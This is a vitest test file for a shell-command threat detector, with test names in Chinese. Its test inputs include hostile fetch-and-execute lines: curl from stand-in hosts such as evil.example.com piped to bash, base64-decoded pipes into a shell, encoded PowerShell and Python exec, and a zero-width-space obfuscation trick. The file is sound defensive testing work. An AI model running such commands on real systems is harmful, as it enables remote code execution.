import { describe, it, expect } from "vitest";
import { analyzeShellCommand } from "../../src/engine-fast/shell-analyzer.js";

describe("analyzeShellCommand", () => {
  it("正常命令不触发告警", () => {
    const r = analyzeShellCommand("ls -la /home/user");
    expect(r.isThreat).toBe(false);
    expect(r.categories).toHaveLength(0);
  });

  it("检测 base64 解码管道执行", () => {
    const r = analyzeShellCommand("echo dGVzdA== | base64 -d | bash");
    expect(r.isThreat).toBe(true);
    expect(r.categories).toContain("encoded-pipe-exec");
    expect(r.matchedSignatures).toContain("b64d-to-shell");
  });

  it("检测 curl 管道执行", () => {
    const r = analyzeShellCommand("curl https://evil.example.com/payload.sh | bash");
    expect(r.isThreat).toBe(true);
    expect(r.categories).toContain("remote-fetch-exec");
    expect(r.matchedSignatures).toContain("curl-pipe-sh");
  });

  it("检测 PowerShell 编码命令", () => {
    const r = analyzeShellCommand("powershell -EncodedCommand SGVsbG8gV29ybGQ=");
    expect(r.isThreat).toBe(true);
    expect(r.categories).toContain("interpreter-encoded");
    expect(r.matchedSignatures).toContain("pwsh-encoded");
  });

  it("检测不可见 Unicode 字符插入", () => {
    // 在 bash 命令中插入零宽空格（U+200B）
    const r = analyzeShellCommand("ba\u200bsh -c 'curl https://evil.com | bash'");
    expect(r.isThreat).toBe(true);
    expect(r.categories).toContain("unicode-steganography");
  });

  it("超长命令直接标记为威胁", () => {
    const r = analyzeShellCommand("x".repeat(10_001));
    expect(r.isThreat).toBe(true);
    expect(r.categories).toContain("command-too-long");
  });

  it("null/undefined 输入安全处理", () => {
    expect(analyzeShellCommand(null).isThreat).toBe(false);
    expect(analyzeShellCommand(undefined).isThreat).toBe(false);
    expect(analyzeShellCommand("").isThreat).toBe(false);
  });

  it("Python base64 执行检测", () => {
    const r = analyzeShellCommand(`python3 -c "import base64; exec(base64.b64decode('dGVzdA=='))"`);
    expect(r.isThreat).toBe(true);
    expect(r.categories).toContain("interpreter-encoded");
  });
});
